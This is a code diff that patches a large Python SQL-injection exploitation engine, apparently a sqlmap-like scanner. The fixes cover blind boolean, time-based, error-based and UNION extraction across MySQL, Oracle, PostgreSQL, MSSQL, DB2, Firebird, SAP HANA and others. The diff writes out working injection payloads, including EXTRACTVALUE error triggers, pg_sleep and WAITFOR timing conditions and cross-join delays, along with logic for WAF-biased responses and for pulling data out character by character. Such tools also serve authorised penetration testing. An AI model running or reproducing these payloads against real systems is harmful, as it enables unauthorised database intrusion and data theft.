@@ -45846,6 +45846,13 @@ async def blind_extract_string(engine,config,queries,sql_query,result,method,url
             _char_func_template = _char_func_template.replace("ASCII(", "UNICODE(", 1)
         elif _detected_dbms_bls == "SQLite" and "ASCII(" in _char_func_template:
             _char_func_template = _char_func_template.replace("ASCII(", "UNICODE(", 1)
+            # FIX-SQLITE-UNICODE-COALESCE: UNICODE() returns NULL when pos > LEN(string).
+            # Without a NULL guard the binary search receives NULL>mid → UNKNOWN → False,
+            # so lo never moves and chr(0) is returned for every position past the first.
+            # Wrap with COALESCE(...,0) so end-of-string positions yield 0 (terminates search).
+            if not _char_func_template.upper().startswith("COALESCE(") and \
+                    not _char_func_template.upper().startswith("IFNULL("):
+                _char_func_template = f"COALESCE({_char_func_template},0)"
         elif _detected_dbms_bls == "Oracle":
             # BUG-ORACLE-CHAR-ASCII FIX (Req 7/8/10): Oracle's ASCII() only handles
             # codepoints 0-127. For characters above U+007F the correct template is already
@@ -46712,6 +46719,19 @@ def _build_dbms_len_func(sql_query: str, queries: Dict, dbms: str) -> str:
     elif dbms == "Oracle":
         # BUG-ORCH-M3-LENF-MSSQL-ORACLE FIX: _oracle_ensure_dual applied above.
         # LENGTHC counts Unicode code-points (NLS-independent); NVL guards NULL.
+        # FIX-BUILD-LENF-ORACLE-ROWNUM1: _oracle_ensure_dual only adds FROM DUAL;
+        # it does NOT guard multi-row queries (SELECT col FROM tbl) against ORA-01427
+        # "single-row subquery returns more than one row". Add ROWNUM=1 inline.
+        _ora_up2 = (_sq or "").upper()
+        if ("SELECT" in _ora_up2 and
+                "ROWNUM" not in _ora_up2 and
+                "TOP " not in _ora_up2):
+            if "ORDER BY" in _ora_up2:
+                _sq = f"SELECT * FROM ({_sq}) _bdf_r WHERE ROWNUM=1"
+            elif "WHERE" in _ora_up2:
+                _sq = f"{_sq} AND ROWNUM=1"
+            else:
+                _sq = f"{_sq} WHERE ROWNUM=1"
         return f"NVL(LENGTHC(({_sq})),0)"
     elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
         # BUG-V168-BUILD-LENF-PG-COMPAT-MISSING FIX (HIGH): The previous check used
@@ -56518,7 +56538,23 @@ class Scanner:
                     await asyncio.sleep(_delay * 0.3)
                     continue
                 if r:
-                    return ch
+                    # FIX-EQCHAR-CONFIRM: Confirm by testing the NEXT candidate returns False/None.
+                    # When the oracle is biased-True (WAF blocks complex SQL → 155B = True body),
+                    # the very first candidate 'e' always returns True regardless of real data.
+                    # Fix: test that at least one neighbouring char returns NOT True before committing.
+                    _fc_idx = _FREQ_CHARS.find(ch)
+                    _confirm_ch = _FREQ_CHARS[(_fc_idx + 1) % len(_FREQ_CHARS)]
+                    _esc_cc = _confirm_ch.replace("'", "''")
+                    if _dbms in ("MSSQL", "Sybase"):
+                        _eq_confirm_cond = f"{_sub_fn}=N'{_esc_cc}'"
+                    else:
+                        _eq_confirm_cond = f"{_sub_fn}='{_esc_cc}'"
+                    _r_cc = await _cached_eval(_eq_confirm_cond)
+                    if _r_cc is not True:
+                        return ch  # Confirmed genuine: neighbour returned False or None
+                    # Both returned True → oracle biased; continue to next candidate
+                    await asyncio.sleep(_delay * 0.3)
+                    continue
                 await asyncio.sleep(_delay * 0.3)
             # BUG-EQUALITY-LATIN1 FIX: _FREQ_CHARS only covers printable ASCII (32-126).
             # _LATIN1_FREQ holds integer code points for common extended Latin-1 characters
@@ -56616,8 +56652,12 @@ class Scanner:
                         _r_next = await _cached_eval(f"{_len_fn}={_try_len + 1}")
                         if _r_next is True:
                             _confirmed = False  # oracle returned True for N+1 too — unreliable
-                    # Both neighbors returned None: oracle too noisy — don't trust this True
-                    if _confirmed and _try_len > 0 and _r_prev is None and _r_next is None:
+                    # FIX-EQLEN-NEXT-NONE: Reject when r_next is None (oracle intermittent for N+1)
+                    # even when r_prev=False — an uncertain N+1 probe means we can't confirm the boundary.
+                    if _confirmed and _try_len < max_len and _r_next is None:
+                        _confirmed = False
+                    # Reject when r_prev is None and we were able to probe it (N > 0)
+                    if _confirmed and _try_len > 0 and _r_prev is None:
                         _confirmed = False
                     if _confirmed:
                         return _try_len
@@ -56861,7 +56901,16 @@ class Scanner:
                     await asyncio.sleep(_delay * 0.3)
                     continue
                 if r:
-                    return chr(ascii_val)
+                    # FIX-SUBCHAR-CONFIRM: Confirm by testing the NEXT ASCII value returns False.
+                    # Mirrors the equality oracle bias guard in _extract_char_equality.
+                    _sa_next = (_FREQ_ASCII[(_FREQ_ASCII.index(ascii_val) + 1) % len(_FREQ_ASCII)]
+                                if ascii_val in _FREQ_ASCII else (ascii_val + 1))
+                    _r_sc = await _cached_eval(f"{_ascii_fn}-{_sa_next}=0")
+                    if _r_sc is not True:
+                        return chr(ascii_val)  # Confirmed genuine
+                    # Both True → oracle biased; continue
+                    await asyncio.sleep(_delay * 0.3)
+                    continue
                 await asyncio.sleep(_delay * 0.3)
             return None
 
@@ -56918,8 +56967,11 @@ class Scanner:
                         _r_sub_next = await _cached_eval(f"{_len_fn}-{_try_len + 1}=0")
                         if _r_sub_next is True:
                             _sub_confirmed = False
-                    # Both neighbors returned None: oracle too noisy — don't trust this True
-                    if _sub_confirmed and _try_len > 0 and _r_sub_prev is None and _r_sub_next is None:
+                    # FIX-SUBLEN-NEXT-NONE: Reject when r_sub_next is None (oracle intermittent for N+1)
+                    if _sub_confirmed and _try_len < max_len and _r_sub_next is None:
+                        _sub_confirmed = False
+                    # Reject when r_sub_prev is None and we were able to probe it
+                    if _sub_confirmed and _try_len > 0 and _r_sub_prev is None:
                         _sub_confirmed = False
                     if _sub_confirmed:
                         _length = _try_len
@@ -67880,20 +67932,27 @@ async def blind_extract_string_v5(
         if ("SELECT" in _bes5_ora_sql_upper and
                 "ROWNUM" not in _bes5_ora_sql_upper and
                 "TOP " not in _bes5_ora_sql_upper):
-            # BUG-BES5-ORA-ROWNUM-FIX: the previous form
-            #   (SELECT ({sql_query}) FROM DUAL WHERE ROWNUM=1)
-            # puts ROWNUM=1 on the DUAL table (always 1 row anyway) while the inner
-            # scalar subquery ({sql_query}) is still evaluated without restriction,
-            # raising ORA-01427 when it returns more than one row.
-            # Fix: inject ROWNUM=1 directly into the inner query so Oracle limits it
-            # before the scalar-subquery evaluation, not after.
-            if "WHERE" in _bes5_ora_sql_upper:
+            # FIX-BES5-ORA-ROWNUM: inject ROWNUM=1 into the inner query.
+            # When the query has an ORDER BY clause, injecting ROWNUM=1 via
+            # "WHERE ROWNUM=1" after ORDER BY produces ORA-00933 (SQL command
+            # not properly ended) because Oracle requires WHERE before ORDER BY.
+            # Fix: for ORDER BY queries, use the outer-subquery wrapper form
+            #   (SELECT * FROM (<original_query>) _bes5r WHERE ROWNUM=1)
+            # which applies ROWNUM=1 after ordering without syntax errors.
+            # For queries without ORDER BY, inject ROWNUM=1 directly which is
+            # faster (avoids the extra FROM + inline-view parse overhead).
+            if "ORDER BY" in _bes5_ora_sql_upper:
+                _bes5_ora_scalar = f"(SELECT * FROM ({sql_query}) _bes5r WHERE ROWNUM=1)"
+            elif "WHERE" in _bes5_ora_sql_upper:
                 _bes5_ora_scalar = f"({sql_query} AND ROWNUM=1)"
             else:
                 _bes5_ora_scalar = f"({sql_query} WHERE ROWNUM=1)"
         else:
             # Already scalar (ROWNUM-guarded) or non-SELECT expression.
             _bes5_ora_scalar = sql_query
+        # FIX-BES5-ORA-CHARFUNC: propagate the ROWNUM-guarded scalar back to sql_query so
+        # extract_pos closure substitutes {query} with the guarded form, not the raw query.
+        sql_query = _bes5_ora_scalar
         # _oracle_ensure_dual already applied above, so FROM DUAL is present if needed.
         len_func = f"NVL(LENGTHC(({_bes5_ora_scalar})),0)"
     elif _bes5_dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
@@ -67915,8 +67974,22 @@ async def blind_extract_string_v5(
         # blind_extract_string, FastExtractionEngine.error_extract_string,
         # _extract_via_detection_template, and all other extraction engines.
         # COALESCE guards NULL; CHAR_LENGTH counts characters not bytes for UTF-8.
+        # FIX-BES5-PG-LIMIT1: For multi-row SELECT queries, the scalar subquery
+        # (SELECT col FROM tbl) raises "more than one row returned by a subquery".
+        # Add LIMIT 1 to guard against this; also update sql_query so extract_pos
+        # closure uses the same guarded form.
+        _bes5_pg_upper = (sql_query or "").upper()
+        if ("SELECT" in _bes5_pg_upper and
+                "LIMIT " not in _bes5_pg_upper and
+                "ROWNUM" not in _bes5_pg_upper and
+                "TOP " not in _bes5_pg_upper):
+            sql_query = f"{sql_query} LIMIT 1"
         len_func = f"COALESCE(CHAR_LENGTH(({sql_query})),0)"
     elif _bes5_dbms == "SQLite":
+        # FIX-BES5-SQLITE-LIMIT1: Guard multi-row subquery for SQLite.
+        _bes5_sl_upper = (sql_query or "").upper()
+        if "SELECT" in _bes5_sl_upper and "LIMIT " not in _bes5_sl_upper:
+            sql_query = f"{sql_query} LIMIT 1"
         len_func = f"COALESCE(LENGTH(({sql_query})),0)"
     elif _bes5_dbms in ("MySQL", "MariaDB", "TiDB"):
         # CHAR_LENGTH for multi-byte safety; COALESCE guards NULL.
@@ -67935,6 +68008,13 @@ async def blind_extract_string_v5(
         # CHAR_LENGTH() always returns the Unicode character count in TiDB (MySQL-wire-compat).
         # Numeric safety: CHAR_LENGTH() is a read-only scalar returning an integer;
         # COALESCE guards NULL; neither modifies comparison operands.
+        # FIX-BES5-MYSQL-LIMIT1: Guard multi-row subquery for MySQL/MariaDB/TiDB.
+        _bes5_my_upper = (sql_query or "").upper()
+        if ("SELECT" in _bes5_my_upper and
+                "LIMIT " not in _bes5_my_upper and
+                "ROWNUM" not in _bes5_my_upper and
+                "TOP " not in _bes5_my_upper):
+            sql_query = f"{sql_query} LIMIT 1"
         len_func = f"COALESCE(CHAR_LENGTH(({sql_query})),0)"
     else:
         # Generic / unknown DBMS: use queries dict or safe fallback.
@@ -68058,6 +68138,10 @@ async def blind_extract_string_v5(
             _bes5_char_func_tpl = _bes5_char_func_tpl.replace("ASCII(", "UNICODE(", 1)
             if "ISNULL" not in _bes5_char_func_tpl.upper():
                 _bes5_char_func_tpl = f"ISNULL({_bes5_char_func_tpl},0)"
+        # FIX-BES5-SYBASE-SUBSTR: Sybase ASE does not support SUBSTR() — only SUBSTRING().
+        # The generic fallback template uses SUBSTR(({query}),{pos},1); replace it.
+        if "SUBSTR(" in _bes5_char_func_tpl and "SUBSTRING(" not in _bes5_char_func_tpl.upper():
+            _bes5_char_func_tpl = _bes5_char_func_tpl.replace("SUBSTR(", "SUBSTRING(")
         _bes5_char_hi = 65535  # BUG-V177-BLS5-SYBASE-CHAR-HI FIX: was implicit 255 (default)
 
     sem    = asyncio.Semaphore(min(getattr(config, 'threads', 1), 4))  # FIX-CPU: cap at 4 concurrent extractions
@@ -77792,7 +77876,8 @@ class FastExtractionEngine:
 
     ROW_SEPARATOR   = "||SQRR||"
     COL_SEPARATOR   = "||SQRC||"
-    CHUNK_SIZE      = 28   # Safe EXTRACTVALUE truncation limit
+    CHUNK_SIZE      = 28   # Safe EXTRACTVALUE truncation limit (MySQL/MSSQL/PG)
+    CHUNK_SIZE_ORACLE = 14  # Oracle: RAWTOHEX doubles size → 14 bytes = 28 hex chars ≤ 30-char thesaurus limit
 
     def __init__(self, engine: HTTPEngine, config: Config,
                  result: DetectionResult, queries: Dict,
@@ -77925,13 +78010,15 @@ class FastExtractionEngine:
         # (nothing before it = no HTML contamination). The extraction block below is
         # updated to discard the empty first element produced by the leading separator.
         if len(sql_cols) == 1:
-            # Single column: still add leading separator for consistent extraction logic
+            # FIX-UNION-SINGLE-COL-TRAILING-SEP: Add BOTH leading AND trailing separator so
+            # extraction logic can find the value between two separators, preventing HTML
+            # contamination after the value. Multi-column branches already have trailing sep.
             if _ue_dbms in ("MySQL", "MariaDB", ""):
-                concat_expr = f"CONCAT({_sep_lit},{sql_cols[0]})"
+                concat_expr = f"CONCAT({_sep_lit},{sql_cols[0]},{_sep_lit})"
             elif _ue_dbms in ("MSSQL", "Sybase"):
-                concat_expr = f"{_sep_lit}+{sql_cols[0]}"
+                concat_expr = f"{_sep_lit}+{sql_cols[0]}+{_sep_lit}"
             else:
-                concat_expr = f"{_sep_lit}||{sql_cols[0]}"
+                concat_expr = f"{_sep_lit}||{sql_cols[0]}||{_sep_lit}"
         elif _ue_dbms in ("MySQL", "MariaDB", ""):
             # MySQL CONCAT() is variadic — safe to pass N arguments; leading sep prepended
             parts = [_sep_lit]
@@ -78223,9 +78310,12 @@ class FastExtractionEngine:
         _parts = extracted.split(self.COL_SEPARATOR)
         
         # BUG #3 CRITICAL FIX: Validate separator count matches expected structure
-        # With leading separator, we expect: ["...HTML...", "col1", "col2", ..., "colN", ...trailing...]
-        # Minimum parts = n_cols + 1 (empty first part from leading sep + N columns)
-        _expected_min_parts = n_cols + 1
+        # With BOTH leading AND trailing separators:
+        #   SEP col1 SEP col2 SEP ... colN SEP <trailing_HTML>
+        # split(SEP) → ["", "col1", "col2", ..., "colN", "<trailing>"]
+        # Minimum parts = n_cols + 2 (empty from leading + N cols + 1 trailing fragment)
+        # FIX-UNION-MIN-PARTS: was n_cols+1; trailing sep added to all branches → n_cols+2
+        _expected_min_parts = n_cols + 2
         if len(_parts) < _expected_min_parts:
             LOG.warning(f"[union_extract_row] Separator count mismatch: got {len(_parts)} parts, "
                        f"expected >={_expected_min_parts} (n_cols={n_cols}). "
@@ -78781,7 +78871,12 @@ class FastExtractionEngine:
 
         chunks: List[str] = []
         chunk_size = self.CHUNK_SIZE
-        
+        # FIX-ORACLE-CHUNKSIZE: Oracle CTXSYS.DRITHSX.SN thesaurus name is limited to 30 chars.
+        # RAWTOHEX doubles byte count, so CHUNK_SIZE=28 → 56 hex chars > 30-char limit → truncation.
+        # Use a smaller chunk for Oracle so RAWTOHEX output stays ≤ 28 hex chars (14 bytes).
+        if dbms == "Oracle":
+            chunk_size = self.CHUNK_SIZE_ORACLE
+
         # ROOT CAUSE #3 FIX: Initialize detection prefix/suffix once before chunk loop
         # These define the working injection context discovered during detection
         # CRITICAL FIX #4: Properly validate detection attributes
@@ -79031,7 +79126,14 @@ class FastExtractionEngine:
             else:
                 # Fallback: EXTRACTVALUE for unknown DBMS (MySQL-like error trigger)
                 payload_body = f"AND EXTRACTVALUE(1,CONCAT(0x7e,({chunk_sql}),0x7e))-- -"
-            
+
+            # FIX-FEE-SUFFIX: Apply detected injection suffix instead of hardcoded '-- -'.
+            # When injection context requires ')-- -', '#', or other suffixes, the hardcoded
+            # '-- -' produces syntactically invalid SQL → _fee_has_err=False → all chunks '?'.
+            _ees_sfx = _fee_det_suffix if _fee_det_suffix is not None else '-- -'
+            if payload_body.endswith('-- -') and _ees_sfx != '-- -':
+                payload_body = payload_body[:-4] + _ees_sfx
+
             # ROOT CAUSE FIX: Build full payload with context prefix for initial attempt
             payload = f"' {payload_body}"
 
@@ -79329,8 +79431,14 @@ class FastExtractionEngine:
                 # Extract value from error message
                 # FIX-v19.18: comprehensive error patterns for all DBMSes
                 # BUG FIX #8: IMPROVED ERROR PATTERN MATCHING
-                # MySQL EXTRACTVALUE format uses ~...~ markers; try this first
-                m = _re.search(r'~([^~]{1,40})~', body)
+                # MySQL EXTRACTVALUE format uses ~...~ markers; try this first.
+                # FIX-MYSQL-TILDE: Use anchored XPATH-pattern first to avoid truncation when
+                # extracted data itself contains '~' (e.g. URLs, paths, CSS ~/).
+                # The XPATH error message format is: XPATH syntax error: '~VALUE~'
+                # Fallback regex uses non-greedy .+? with DOTALL to allow any char.
+                m = _re.search(r"XPATH syntax error:\s*['\"]~(.+?)~['\"]", body, _re.DOTALL | _re.I)
+                if not m:
+                    m = _re.search(r'~(.{1,200}?)~', body, _re.DOTALL)
                 
                 # BUG-FEE-ALT-PATTERN-ORDER FIX (HIGH): Previously, broad alt patterns
                 # (r"'([^']{1,100})'", r'"([^"]{1,100})"', etc.) were tried BEFORE
@@ -118299,7 +118407,7 @@ class UniversalScanOrchestrator:
                                                                        extra_headers=_cdn_hdrs_ibo),
                                                         timeout=10)
                                                     if _fp_b is None:
-                                                        return False
+                                                        return None  # FIX-IBO-NULL-NONE: None response = indeterminate, not confirmed-false
                                                     # WAF block detection: 4xx from WAF is ambiguous noise
                                                     _fp_b_s = getattr(_fp_b, 'status_code', None)
                                                     if _fp_b_s is not None and _fp_b_s in (400, 403, 406, 429, 430, 503):
@@ -118336,7 +118444,7 @@ class UniversalScanOrchestrator:
                                                         return _sim < _ibo_thresh  # inverted: low sim = SQL TRUE
                                                     return _sim >= _ibo_thresh
                                                 except Exception:
-                                                    return False
+                                                    return None  # FIX-IBO-EXC-NONE: exception = indeterminate, not confirmed-false
 
                                             # Wire the inline oracle as the MSE boolean oracle
                                             # so _extract_str picks it up via the mse_boolean path
@@ -119366,7 +119474,7 @@ class UniversalScanOrchestrator:
                                                             return _sim < _wb_thresh  # inverted: low sim = SQL TRUE
                                                         return _sim >= _wb_thresh
                                                     except Exception:
-                                                        return False
+                                                        return None  # FIX-IBOWB-EXC-NONE: exception = indeterminate, not confirmed-false
 
                                                 # BUG-WB-ORACLE-BASELINE-RETRY FIX: Only wire the oracle
                                                 # when we have a valid (non-empty) baseline. If all 3
@@ -133993,9 +134101,13 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
             # not exist in YugabyteDB → SQL error → fast response → timing oracle fails
             # → empty extraction on ALL YugabyteDB T/TH/HQ sessions. Same fix pattern
             # as v117 BUG-ITO-CRDB-YG-SYBASE-BRANCH for _inline_timing_oracle.
+            # FIX-PG-SLEEP-VOID: pg_sleep() returns void; IS NOT NULL on void is
+            # unreliable (raises "function returning void cannot be used here" on some PG
+            # versions). Cast to TEXT so the CASE expression has a non-void type.
             return (
-                f"{_tp_pfx}AND (CASE WHEN ({condition}) THEN (SELECT pg_sleep({t})) "
-                f"ELSE (SELECT pg_sleep(0)) END) IS NOT NULL{_tp_sfx}"
+                f"{_tp_pfx}AND (CASE WHEN ({condition}) "
+                f"THEN (SELECT CAST(pg_sleep({t}) AS TEXT)) "
+                f"ELSE (SELECT CAST(pg_sleep(0) AS TEXT)) END) IS NOT NULL{_tp_sfx}"
             )
         elif dbms == "Oracle":
             # FIX-ORACLE-TIMING (Req 8/10): DBMS_SESSION.SLEEP is a PROCEDURE in
@@ -134033,18 +134145,32 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                 _syb_mm = _t_int_syb // 60
                 _syb_ss = _t_int_syb % 60
                 return f"{_syb_pfx} IF ({condition}) WAITFOR DELAY '0:{_syb_mm:02d}:{_syb_ss:02d}'{_tp_sfx}"
+            # FIX-DB2-COUNT-CASE: DB2/Informix CASE WHEN (const_cond) THEN COUNT(*) ELSE 0
+            # without GROUP BY is rejected by strict DB2 LUW and Informix parsers because
+            # mixing a non-aggregate WHEN condition with an aggregate THEN branch requires
+            # GROUP BY in those engines.  Move COUNT(*) into a scalar subquery so the outer
+            # CASE only sees integer scalars, never a raw aggregate call.
             if dbms == "DB2":
-                return (f"{_tp_pfx}AND (SELECT CASE WHEN ({condition}) THEN COUNT(*) ELSE 0 END FROM SYSCAT.TABLES A, SYSCAT.TABLES B, SYSCAT.TABLES C)>0{_tp_sfx}")
-            return (f"{_tp_pfx}AND (SELECT CASE WHEN ({condition}) THEN COUNT(*) ELSE 0 END FROM systables A, systables B, systables C)>0{_tp_sfx}")
+                return (f"{_tp_pfx}AND (SELECT CASE WHEN ({condition}) "
+                        f"THEN (SELECT COUNT(*) FROM SYSCAT.TABLES A, SYSCAT.TABLES B, SYSCAT.TABLES C) "
+                        f"ELSE 0 END FROM SYSIBM.SYSDUMMY1)>0{_tp_sfx}")
+            return (f"{_tp_pfx}AND (SELECT CASE WHEN ({condition}) "
+                    f"THEN (SELECT COUNT(*) FROM systables A, systables B, systables C) "
+                    f"ELSE 0 END FROM informix.systables WHERE tabid=1)>0{_tp_sfx}")
         elif dbms == "Firebird":
             # FIX-v19.12: Firebird has no SLEEP() or IF(). Use heavy cross-join
             # from rdb$fields (system table present in every Firebird DB).
-            return (f"{_tp_pfx}AND (SELECT CASE WHEN ({condition}) THEN COUNT(*) ELSE 0 END "
-                    f"FROM rdb$fields A, rdb$fields B, rdb$fields C)>0{_tp_sfx}")
+            # FIX-FIREBIRD-COUNT-CASE: Same issue as DB2 — move COUNT(*) into scalar subquery.
+            return (f"{_tp_pfx}AND (SELECT CASE WHEN ({condition}) "
+                    f"THEN (SELECT COUNT(*) FROM rdb$fields A, rdb$fields B, rdb$fields C) "
+                    f"ELSE 0 END FROM rdb$database)>0{_tp_sfx}")
         elif dbms == "SAP_HANA":
             # FIX-v19.12: SAP HANA has no SLEEP(). Use heavy cross-join from SYS.M_TABLES.
-            return (f"{_tp_pfx}AND (SELECT CASE WHEN ({condition}) THEN COUNT(*) ELSE 0 END "
-                    f"FROM SYS.M_TABLES A, SYS.M_TABLES B)>0{_tp_sfx}")
+            # FIX-SAPHANA-COUNT-CASE: SAP HANA Column Store requires GROUP BY when mixing
+            # aggregate THEN with non-aggregate WHEN; move COUNT into scalar subquery.
+            return (f"{_tp_pfx}AND (SELECT CASE WHEN ({condition}) "
+                    f"THEN (SELECT COUNT(*) FROM SYS.M_TABLES A, SYS.M_TABLES B) "
+                    f"ELSE 0 END FROM SYS.DUMMY)>0{_tp_sfx}")
         elif dbms == "ClickHouse":
             # FIX-v19.12: ClickHouse has sleep() and if() but syntax differs from MySQL.
             # ClickHouse: if(cond, then, else)  same positional syntax, but sleep()
@@ -134391,7 +134517,14 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
             return ms
 
         def _cal_hit(ms: float) -> bool:
-            return ms > _base_time * 1.2 + 100
+            # FIX-CAL-HIT-THRESHOLD: The original `base * 1.2 + 100` fails for slow-baseline
+            # servers when base is large relative to t (e.g. base=5000ms, t=1s:
+            # threshold=6100ms but response=6000ms → miss).
+            # Add a sleep-relative alternative: fire if at least 40% of t is visible above
+            # baseline. Use min() for OR semantics — hit when EITHER threshold is satisfied.
+            _t_heuristic  = _base_time * 1.2 + 100       # original: 20% above baseline
+            _t_sleep_rel  = _base_time + t * 1000 * 0.4  # 40% of sleep time above baseline
+            return ms > min(_t_heuristic, _t_sleep_rel)
 
         # Strategy 0: standard form
         _std_ms = await _calibrate_probe(timing_payload("1=1"), tamper_chain)
@@ -134781,7 +134914,11 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
         else:
             _char_hi_init = 126    # ASCII_VAL (Firebird) / other ASCII-only functions
         lo, hi = _char_lo_init, _char_hi_init
-        _pos_deadline = time.monotonic() + t * 4 + 12  # per-position timeout
+        # FIX-POS-DEADLINE: base deadline on bit-depth of char range, not a fixed factor.
+        # For full Unicode (char_hi=1,114,111) the binary search needs ~20 timing probes;
+        # with t=5s each that's ~100s — far beyond the old 4*t+12 = 32s cap.
+        _n_bits_hi = max(7, (_char_hi_init).bit_length())
+        _pos_deadline = time.monotonic() + _n_bits_hi * (t + 1) + 15  # per-position timeout
         while lo < hi:
             if time.monotonic() > _pos_deadline:
                 LOG.debug(f'[TBExtract] pos={pos} per-position deadline  breaking')
@@ -134868,6 +135005,23 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                     else:
                         # BUG-V136-GT-STRICT-OPERATOR-ALL-ENGINES FIX: was >{mid}.
                         cond = f'{_ora_char_expr}>={mid+1}'
+                elif dbms in ("MySQL", "MariaDB", "TiDB") and _ascii_func == "ORD":
+                    # FIX-MYSQL-ORD-UTF32: MySQL/MariaDB/TiDB ORD() returns a byte-compound
+                    # for multi-byte UTF-8 characters, NOT the Unicode code point.
+                    # For 'é' (U+00E9=233): ORD('é') = 195 + 169*256 = 43459 (WRONG).
+                    # ORD(CONVERT('é' USING utf32)) = 233 (CORRECT Unicode code point).
+                    # The binary search converges to the ORD value and chr() is applied —
+                    # 43459 produces chr(43459) = some obscure CJK character, not 'é'.
+                    # Fix: wrap the SUBSTRING result in CONVERT(... USING utf32) so ORD()
+                    # sees a 4-byte UTF-32 representation and returns the actual code point.
+                    # Numeric safety: only changes the wrapping function call; the integer
+                    # comparison operands (mid+1, _char_hi_init) are unchanged.
+                    if _gt_blocked:
+                        cond = (f'ORD(CONVERT({substr}({_sql_inner},{pos},1)'
+                                f' USING utf32)) BETWEEN {mid+1} AND {_char_hi_init}')
+                    else:
+                        cond = (f'ORD(CONVERT({substr}({_sql_inner},{pos},1)'
+                                f' USING utf32))>={mid+1}')
                 else:
                     # BUG FIX: The previous hardcoded BETWEEN {mid+1} AND 255 was wrong
                     # for MSSQL and SQLite, which use UNICODE() returning 0-65535.
@@ -135058,7 +135212,11 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                     LOG.debug(f"[TBExtract] pos={pos} mid={mid} _send_injected returned None (after retry) — treating as indeterminate")
                     continue
                 _ext_ref = min(_base_time, 200)
-                _ext_diff_t = max(_ext_ref * 2.5, _ext_ref + 400)
+                # FIX-IS-TRUE-JITTER: the original _ext_diff_t = max(ref*2.5, ref+400)
+                # is too low for short baselines (ref=50ms → _ext_diff_t=450ms).
+                # Normal server jitter can reach 460ms, causing false True even without sleep.
+                # Add a sleep-relative floor: at least 30% of t must be visible above ref.
+                _ext_diff_t = max(_ext_ref * 2.5, _ext_ref + 400, _base_time + t * 1000 * 0.3)
                 _is_true = fp.elapsed_ms >= timing_thresh or fp.elapsed_ms >= _ext_diff_t
                 if pos == 1:
                     LOG.debug(f"[TBExtract] pos=1 elapsed={fp.elapsed_ms:.0f}ms "
@@ -151647,11 +151805,23 @@ class BitwiseExtractorV18(BitwiseExtractor):
                 except UnicodeDecodeError:
                     pass
 
-        # Fallback: treat as Latin-1
+        # FIX-BEXTV18-BUG4: restore V17's char_code>=128 → _binary_search_fallback.
+        # V18 replaced this with UTF-8 byte-reconstruction paths (0xC2-0xDF, 0xE0-0xEF).
+        # Those paths are wrong for code-point-returning functions (ORD/ASCII/UNICODE):
+        # _extract_continuation_byte extracts raw bytes from the INTEGER return value of
+        # the char_func, always yielding None/garbage → UnicodeDecodeError → falls to
+        # chr(byte_val) which is only correct for Latin-1 (U+0080-U+00FF).  For any code
+        # point > 255 (Ł=U+0141, α=U+03B1, 中=U+4E2D, emoji=U+1F600) the lower-8-bit
+        # reconstruction truncates the value silently.
+        # Additionally byte_val 128-159 (0x80-0x9F) has no handler at all — returns None.
+        # Fix: after the ASCII (0-127) and UTF-8-decode attempts above have all been
+        # exhausted, call _binary_search_fallback which uses binary bisection over the
+        # full DBMS char range (0.._build_dbms_char_hi) to get the exact code point.
+        # This correctly handles all non-ASCII characters for all DBMS types.
         self._ascii_run = 0
-        if 160 <= byte_val <= 255:
-            return chr(byte_val)
-        return None
+        self._fallback_count += 1
+        result = await self._binary_search_fallback(char_func, dbms)
+        return result
 
     async def _extract_continuation_byte(self, char_func: str, dbms: str,
                                            offset: int) -> Optional[int]:
